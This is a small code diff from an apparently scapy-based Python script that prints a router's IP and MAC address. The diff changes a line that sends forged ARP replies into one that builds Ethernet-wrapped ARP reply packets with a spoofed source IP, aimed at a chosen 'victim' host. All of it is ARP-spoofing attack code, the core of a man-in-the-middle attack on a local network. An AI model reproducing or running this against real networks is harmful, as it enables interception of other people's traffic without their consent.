@@ -34,8 +34,7 @@ print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])
 #except KeyboardInterrupt:
  #   pass
 
-packet = srp(ARP(op=2, pdst=(ip[victim-1]), hwdst=(mac[victim-1]),psrc="10.5.1.60"), verbose=0)
-    # Send previously created packet without output
+packets = [Ether(dst=mac[victim-1]) / ARP(op=2, psrc="10.5.1.3", pdst=ip[victim-1], hwdst=mac[victim-1])]
 
 
     
